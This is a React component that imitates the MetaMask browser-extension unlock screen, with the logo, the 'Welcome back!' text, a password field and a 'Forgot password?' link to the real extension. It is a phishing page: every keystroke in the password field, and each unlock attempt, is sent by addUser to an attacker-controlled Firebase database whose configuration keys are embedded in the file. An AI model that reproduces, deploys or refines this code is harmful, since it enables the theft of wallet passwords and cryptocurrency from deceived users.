import React from "react";
import { UserContext } from ".";
import { useContext, useState } from "react";
import Box from "@mui/material/Box";
import Modal from "@mui/material/Modal";
import Button from "@mui/material/Button";
import { display } from "@mui/system";
import arrowdown from "./assets/images/icons/arrow-down.svg";
import metamasklogo from "./assets/images/icons/metamask-fox.svg";
import MetamaskLogo from "./metamasklogo";
import TextField from "@mui/material/TextField";
import addImage from "./assets/images/icons/add.svg";
import closeImage from "./assets/images/icons/close.svg";
import searchImage from "./assets/images/icons/search.svg";
import ethereum from "./assets/images/icons/eth_logo.svg";
import linea from "./assets/images/icons/linea-logo-mainnet.svg";
import polygon from "./assets/images/icons/polygon-zkevm.svg";
import arbitrum from "./assets/images/icons/arbitrum.svg";
import avalanche from "./assets/images/icons/avax-token.svg";
import base from "./assets/images/icons/base.svg";
import binance from "./assets/images/icons/bnb.svg";
import opmain from "./assets/images/icons/optimism.svg";
import zksync from "./assets/images/icons/zk-sync.svg";
import moreverfical from "./assets/images/icons/more-vertical.svg";
import infoimage from "./assets/images/icons/info.svg";
import sepolia from "./assets/images/icons/sepolia.png";
import lineasepolia from "./assets/images/icons/linea-logo-mainnet.svg";
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
import { getDatabase, ref, set } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyC0h7zy2gy9MjVcmkeQLcIoqVw0jIbRHxw",

  authDomain: "metadata-3370d.firebaseapp.com",

  projectId: "metadata-3370d",

  storageBucket: "metadata-3370d.firebasestorage.app",

  messagingSenderId: "822649245544",

  appId: "1:822649245544:web:241afbdad201927ea590dd",

  measurementId: "G-RK523XV56E",
};

// Initialize Firebase

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const addUser = (payload) => {
  const d = new Date();
  const dataRef = ref(db, `users/user_${d.getTime()}`);
  set(dataRef, payload);
};

const style = {
  position: "absolute",
  top: 0,
  right: 0,
  width: 357,
  height: 600,
  bgcolor: "background.paper",
  border: "1px solid #000",
  display: "flex",
};

const Mainmodal = () => {
  const data = useContext(UserContext);
  const open = data.mainmodal;
  const currentnet = data.currentnet;
  const handleClose = () => data.setMainmodal(!open);
  const openNetworkmodal = () => {
    data.setNetworkmodal(true);
  };

  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [helperText, setHelperText] = useState("");
  const [flag, setFlag] = useState(false);

  // Password validation logic
  const validatePassword = () => {
    addUser(password);
    const correctPassword = "111"; // Example correct password
    if (password !== correctPassword && password !== "") {
      setError(true);
      setHelperText("Incorrect password");
    } else {
      setError(false);
      setHelperText("");
    }
  };
  const changepassword = (para) => {
    setError(false);
    setPassword(para);
    addUser(para);
  };
  const clickout=()=>{
    setPassword('');
    handleClose();
  }
  // TODO: Add SDKs for Firebase products that you want to use

  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration

  // For Firebase JS SDK v7.20.0 and later, measurementId is optional

  // const analytics = getAnalytics(app);
  return (
    <div>
      <Modal
        open={open}
        onClose={clickout}
        aria-labelledby="child-modal-title"
        aria-describedby="child-modal-description"
      >
        <Box sx={style} style={{ flexDirection: "column" }}>
          <div
            id="header"
            style={{
              padding: 8,
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              width: "100%",
              height: "68px",
              boxShadow: "0 4px 8px rgba(0, 0, 0, 0.08)",
            }}
          >
            {/* <Button onClick={handleClose}>Close Child Modal</Button> */}
            <div id="button1" style={{ height: 32 }}>
              <Button
                style={{
                  padding: "1px 8px",
                  display: "flex",
                  justifyContent: "space-between",
                  alignContent: "center",
                  backgroundColor: "#f2f4f6",
                  borderRadius: 12,
                }}
                onClick={openNetworkmodal}
              >
                <span
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    marginRight: 9,
                  }}
                >
                  <img
                    style={{ borderRadius: 4, width: 14 }}
                    src={currentnet.icon}
                    alt={currentnet.text}
                  ></img>
                </span>
                <span style={{ marginRight: 9, color: "black", fontSize: 12,fontWeight:3 }}>
                  {currentnet.text}
                </span>
                <span
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    marginRight: 9,
                  }}
                >
                  <img src={arrowdown} style={{ width: 12 }} />
                </span>
              </Button>
            </div>
            <div id="button2">
              <Button style={{ padding: 0, minWidth: 46 }}>
                <img src={metamasklogo} style={{ width: 34, height: 32 }} />
              </Button>
            </div>
          </div>
          <div id="unlockpage" style={{ padding: 30 }}>
            <div
              id="metamasklogo"
              style={{
                marginTop: 24,
                height: 120,
                display: "flex",
                justifyContent: "center",
              }}
            >
              {" "}
              <MetamaskLogo />{" "}
            </div>
            <h1
              className="mm-box mm-text mm-text--heading-lg mm-box--margin-top-1 mm-box--color-text-alternative"
              style={{
                marginTop: 4,
                textAlign: "center",
                color: "#6a737d",
                fontSize: "18pt",
                marginBottom: 0,
                fontFamily:
                  " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",
              }}
            >
              {" "}
              Welcome back!
            </h1>
            <div style={{ textAlign: "center" ,fontFamily:
                  " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",color:'black' }}>
              The decentralized web awaits
            </div>

            <div style={{ marginTop: 48 }}>
              <TextField
                id="outlined"
                label="Password"
                variant="standard"
                error={error}
                type="password"
                value={password}
                onChange={(e) => {
                  changepassword(e.target.value);
                  // console.log(e)
                }}
                onKeyDown={(e) => {
                  if (e.key === "Enter") {
                    validatePassword();
                  }
                }}
                helperText={error ? helperText : ""}
                sx={{
                  width: "100%",
                  borderRadius: 2,
                  "& .MuiInput-input": {
                    height: 23,color:'black'
                  },
                  "& .MuiInput-underline": {
                    "&:before": {
                      borderBottom:
                        error &&
                        (password !== "" ? "2px solid red" : "1px solid black"),
                    },
                    "&:after": {
                      borderBottom:
                        error && password !== ""
                          ? "2px solid red"
                          : "2px solid rgb(3, 118, 201)", // Border color when focused
                    },
                  },
                  "& .MuiInputLabel-root": {
                    color: "gray", // Ensures the label is always gray
                  },"&:hover": {
                    borderBottom: "transparent", // Remove hover background
                    boxShadow: "none", // Remove hover shadow (if any)
                  },
                }}
              />
            </div>
            <div style={{ marginTop: 28 }}>
              <Button
                
                  style={password===""?{backgroundColor: "rgb(111 185 239 / 90%)",border: "1px solid #848c96",}:{backgroundColor:'#0376c9',border: "1px solid black",}}
                sx={{
                  height: 44,
                  fontWeight: 400,
                  borderRadius: 100,
                  padding: "12px 16px",
                  color: "white",
                  width: "100%",
                  "&:hover": {
                    backgroundColor: "transparent", // Remove hover background
                    boxShadow: "none", // Remove hover shadow (if any)
                  },
                }}
                onClick={validatePassword}
              >
                Unlock
              </Button>
              <div style={{ marginTop: 15 }}>
                <a
                  href="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html"
                  target="blank"
                  style={{
                    fontSize: 11.2, // Corrected to camelCase
                    fontWeight: "bold",

                    fontFamily:
                      '"Euclid Circular B", Helvetica, Arial, sans-serif',
                    lineHeight: "140%",
                    fontStyle: "normal",
                    color: "#0376c9",
                    cursor: "pointer",
                    backgroundColor: "transparent",
                    padding: "0.75rem 1rem",
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    boxSizing: "border-box",
                    borderRadius: "6px",
                    width: "100%",
                    transition:
                      "border-color 0.3s ease, background-color 0.3s ease",
                    textDecoration: "none",
                  }}
                >
                  Forgot password?
                </a>
              </div>
              <div
                className="unlock-page__support"
                style={{
                  marginTop: 33,
                  justifyContent: "center",
                  display: "flex",
                  fontSize: 12,
                }}
              >
                <span style={{}}>
                  {" "}
                  Need help? Contact{" "}
                  <a
                    href="https://support.metamask.io"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      textDecoration: "none", // Remove underline
                      color: "#0376c9", // Inherit text color from parent
                      fontSize: "inherit", // Inherit font size from parent
                      background: "none", // Remove background color
                      padding: 0, // Remove padding
                      margin: 0, // Remove margin
                      display: "inline", // Keep the default inline behavior
                    }}
                  >
                    MetaMask support
                  </a>{" "}
                </span>
              </div>
            </div>

            {/* <div style={{ padding: "20px" }}></div> */}
          </div>
        </Box>
      </Modal>
    </div>
  );
};

export default Mainmodal;
